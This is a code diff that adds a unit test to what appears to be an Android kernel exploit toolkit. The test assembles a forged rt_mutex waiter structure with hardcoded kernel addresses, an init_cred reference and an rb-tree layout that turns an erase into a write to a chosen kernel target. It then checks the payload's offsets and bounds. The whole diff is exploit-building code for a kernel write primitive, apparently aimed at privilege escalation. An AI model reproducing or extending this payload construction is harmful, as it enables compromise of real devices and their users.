@@ -319,6 +319,78 @@ namespace ghostlock::memory {
             if (encode_waiter_words(too_small, 0, pointer_words)) return 0;
             if (encode_waiter_words(window, 9, pointer_words)) return 0;
         }
+        /* The anchored multicast stamp. Its strip starts at waiter_off (0x30 on
+         * the 246 profile) and is the same eleven words, placed by the same
+         * waiter_words()/encode_waiter_words() pair the route calls -- that
+         * call is the only part of the anchored branch host-testable here:
+         * acquire_lock_word() and slide_init_task() are Android-only. Fit:
+         * 0x30 + 0x58 = 0x88 <= 0x108 (264). */
+        {
+            constexpr std::uintptr_t mcast_target = 0xffffff8000129000ULL;
+            constexpr std::uintptr_t mcast_task = 0xffffff802ac00000ULL;
+            constexpr std::uintptr_t mcast_lock = 0xffffff802ec7bd8ULL;
+            constexpr std::size_t mcast_waiter_off = 0x30;
+            constexpr std::size_t mcast_buffer = 264;
+            const WriteRequest mcast_request = WriteRequest::make(
+                mcast_target, WriteMode::Zero, /*leaf=*/false);
+            const PayloadWriteLayout mcast_layout = payload_write_layout(
+                &mcast_request, page, 0x1111, 0x2222, init_cred);
+            const WaiterWords mcast_words =
+                waiter_words(mcast_layout, mcast_task, mcast_lock, 140);
+            std::array<std::byte, mcast_buffer> mcast_stamp{};
+            /* The route writes the family word at offset 8 after the encode;
+             * a nonzero marker there pins that the strip leaves it alone. */
+            mcast_stamp[8] = std::byte{0x5a};
+            if (!encode_waiter_words(mcast_stamp, mcast_waiter_off, mcast_words))
+                return 0;
+            const auto *mcast_bytes =
+                reinterpret_cast<const unsigned char *>(mcast_stamp.data());
+            /* Tree triple: {pc = page + 0x100, right = 0, left = target} -- the
+             * erase stores pc at rb_left and re-parents through it. */
+            if (load64(mcast_bytes, mcast_waiter_off + 0x00) != page + 0x100 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x08) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x10) != mcast_target)
+                return 0;
+            /* PI side parks; task/lock/prio/deadline/ww_ctx are the page-free
+             * words (init_task alias, anchor slot, family prio, two zeroes). */
+            if (load64(mcast_bytes, mcast_waiter_off + 0x18) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x20) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x28) != 0)
+                return 0;
+            if (load64(mcast_bytes, mcast_waiter_off + 0x30) != mcast_task ||
+                load64(mcast_bytes, mcast_waiter_off + 0x38) != mcast_lock ||
+                load64(mcast_bytes, mcast_waiter_off + 0x40) != 140 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x48) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x50) != 0)
+                return 0;
+            /* Nothing outside the strip moved. */
+            if (mcast_stamp[8] != std::byte{0x5a}) return 0;
+            for (std::size_t i = 0; i < mcast_waiter_off; i++) {
+                if (i != 8 && mcast_stamp[i] != std::byte{0}) return 0;
+            }
+            for (std::size_t i = mcast_waiter_off + kWaiterBytes; i < mcast_buffer; i++) {
+                if (mcast_stamp[i] != std::byte{0}) return 0;
+            }
+            /* An exact fit is accepted; one byte less is refused without
+             * writing. */
+            std::array<std::byte, mcast_buffer> exact{};
+            if (!encode_waiter_words(exact, mcast_buffer - kWaiterBytes, mcast_words))
+                return 0;
+            std::array<std::byte, mcast_buffer> overflow{};
+            if (encode_waiter_words(overflow, mcast_buffer - kWaiterBytes + 1,
+                                    mcast_words))
+                return 0;
+            for (const std::byte b : overflow) {
+                if (b != std::byte{0}) return 0;
+            }
+            /* An absent geometry decodes as a negative waiter_off; the size_t
+             * cast must be refused, not wrapped into an in-bounds write. */
+            std::array<std::byte, mcast_buffer> negative{};
+            if (encode_waiter_words(
+                    negative, static_cast<std::size_t>(static_cast<std::int32_t>(-1)),
+                    mcast_words))
+                return 0;
+        }
         /* Multicast geometry that would run past the supplied span is rejected
      * instead of written out of bounds. */
         std::array<std::byte, 0x40> multicast_small{};
